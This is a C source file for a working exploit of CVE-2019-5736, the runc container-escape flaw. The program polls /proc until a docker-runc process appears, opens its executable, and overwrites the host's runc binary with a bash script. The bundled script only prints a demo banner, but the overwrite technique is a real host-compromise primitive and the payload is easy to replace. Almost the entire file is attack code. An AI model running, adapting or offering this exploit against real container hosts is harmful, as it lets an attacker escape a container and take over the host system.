#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>


// make these values global for fast execution speed 
char path[20];
char buf[100];

int pid_aoti(char *s, uint8_t len)
{
//	for (int i=0; i<len; i++)
//	{
//		if( ! isdigit(s[i]))
//			return 0;
//	}
	/* We do not have to check every letter, 
	 * cause atoi will return 0 if input string is not a valid number.
	 * And pid here can not be 0, so glad to see that.
	 */
	return (uint32_t)atoi(s);
}

// getppid() from GNU C Lib can not return the ppid of a specific pid, damn.
/*
int get_ppid(int pid)
{
	sprintf(path, "/proc/%d/status", pid);
	int fd = open(path, O_RDONLY);
	//TODO
	return 0;
}
*/

int dirtywork(char *fdpath)
{
	char buf[] = "#!/bin/bash\n\
echo -e '\\n\\n\\n\\n\\r\
========================================\\n\\r\
=====  Exploit for CVE-2019-5736   =====\\n\\r\
=====  @Author github:kings-way    =====\\n\\r\
=====  @Date 20190212              =====\\n\\r\
========================================\\n\\r\
\n\n\n\\n\\r' > /proc/self/fd/1\n\
exit -1\n\0";
	int fd=0;
	// sleep 1 seconds to wait runc exits, otherwise we will encounter "Text file busy" Error.
	sleep(1);
	if( (fd = open(fdpath, O_WRONLY)) == -1)
		perror("Open with O_WRONLY Error");
	else if(write(fd, buf, strlen(buf)) == -1)
		perror("Write runC Error");
	else
	{
		printf("LOL! Write runC Success, quitting in 2 seconds\n");
		exit(0);
	}
	close(fd);
	return 0;
}

int open_and_keep_fd()
{
	int fd = open(path, O_RDONLY);
	if(fd == -1)
	{
		perror("open_and_keep_fd: Open with O_RDONLY Error");
		return -1;
	}
		
	return fd;
}

void check_exe(uint32_t pid)
{
	// If ppid is 0, it means the parent is from another namespace.
	// That's what we want here.
//	if(get_ppid() != 0)
//		return;

	sprintf(path, "/proc/%d/exe", pid);
	int len=0;
	if((len=readlink(path, buf, 99))>0)
	{
		buf[len] = '\0';
		printf("%s ==> %s\n",path, buf);
		if(strcmp(buf, "/usr/bin/docker-runc") == 0 || 
			strcmp(buf, "/usr/sbin/docker-runc") == 0 || 
			strcmp(buf, "/usr/libexec/docker/docker-runc-current") == 0)
		{
			// try to open file with O_PATH
			int fd = open_and_keep_fd();
			if(fd != -1)
			{	
				char tmp[50];
				sprintf(tmp, "/proc/%d/fd/%d", getpid(), fd);
				printf("\nOpened with fd: %s\n", tmp);
				dirtywork(tmp);
			}
		}
		else if(strncmp(buf, "/memfd:runc_cloned:/proc/self/exe", 18) == 0)
		{
			printf("Already the new runc using memfd, not exploitable, quitting");
			exit(0);
		}
		else
		{
			printf("EXE is not runc, skip...");
		}
	}
	else
	{
		perror("Readlink Error");
		exit(-1);
	}
	return;
}

int main(int argc, char **argv)
{
	if(strcmp(argv[0], "bash") == 0)
	{
		printf("This is a fake bash program only for demo. Quitting in 2 secs\n");
		sleep(2);
		return 0;
	}
	struct dirent *dir;
	DIR *d = opendir("/proc");
	uint32_t pids[1000] = {0};
	uint32_t count = 0;
	uint32_t i, pid = 0;

	while(1)
	{
		rewinddir(d);
		while((dir = readdir(d)) != NULL)
		{
			if( (pid = pid_aoti(dir->d_name, (uint8_t)strlen(dir->d_name))) )
			{
				for (i=0; i<count; i++)
					if(pids[i] == pid)
						break;
				if (i != count)
					continue;
				pids[count++] = pid;
				printf("\n\nNew PID: %d   ", pid);
				check_exe(pid);
			}
		}
	}
	closedir(d);
	return 0;
}
